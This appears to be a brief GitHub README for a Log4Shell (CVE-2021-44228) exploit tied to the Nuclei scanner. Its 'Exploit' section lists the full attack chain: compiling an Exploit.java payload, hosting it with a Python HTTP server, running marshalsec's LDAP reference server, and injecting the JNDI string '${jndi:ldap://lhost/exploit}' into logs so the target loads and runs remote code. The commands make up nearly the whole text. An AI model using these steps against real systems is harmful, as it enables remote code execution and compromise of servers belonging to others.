# Log4jNuclei
# CVE-2021-44228
Log4j for nuclei



# Exploit

```
javac Exploit.java
python3 -m http.server 80
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Exploit

insert log ${jndi:ldap://lhost/exploit}

```
